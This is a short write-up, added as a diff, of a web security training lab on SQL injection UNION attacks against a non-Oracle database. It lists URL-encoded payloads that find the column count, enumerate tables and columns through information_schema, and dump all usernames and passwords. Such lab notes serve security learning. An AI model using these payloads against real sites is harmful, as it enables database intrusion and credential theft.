@@ -1,0 +1,31 @@
+Problem: SQL Injection attack listing database contents on non-Oracle databases
+
+Objectives:
+1. Determeine the Name of the table holding usernames and passwords
+2. Determine column names of table
+3. Find out password of Administrator user
+
+
+Analysis
+Step 1:
+check for sql vulnerablity using ' in the filter
+obseravtion you will get an internal server error
+
+Step 2:
+find out the number of text columns in the given table using union with strings like. UNION select 'abc', 'def'--
+https://0a7c00b80361206880ecc15900840069.web-security-academy.net/filter?category=Pets%27%20UNION%20select%20%27abc%27,%20%27abc%27--
+Observation: you will be able to find the number and type of columns to display usernames, and passwords
+
+Step 3:
+find out the all the table names within the database using information schema.tables
+https://0a7c00b80361206880ecc15900840069.web-security-academy.net/filter?category=Pets%27%20UNION%20select%20table_name,%20NULL%20from%20information_schema.tables--
+We will find that some table names, where one of them is named: users_mhrvwl, which we will probe further
+
+Step 4:
+find out the table with usernames, and passwords, and find the names of columns using information schema.columns
+https://0a7c00b80361206880ecc15900840069.web-security-academy.net/filter?category=Pets%27%20UNION%20select%20column_name,%20NULL%20from%20information_schema.columns%20where%20table_name=%27users_mhrvwl%27--
+we will find the following column names with usenames and passwords: username_sgewfz,password_redwxo
+
+Step 5:
+use union attack to reveal the user names and passwords of all users including administrator, with names of the column names from the previous step
+https://0a7c00b80361206880ecc15900840069.web-security-academy.net/filter?category=Pets%27%20UNION%20select%20username_sgewfz,%20password_redwxo%20from%20users_mhrvwl--
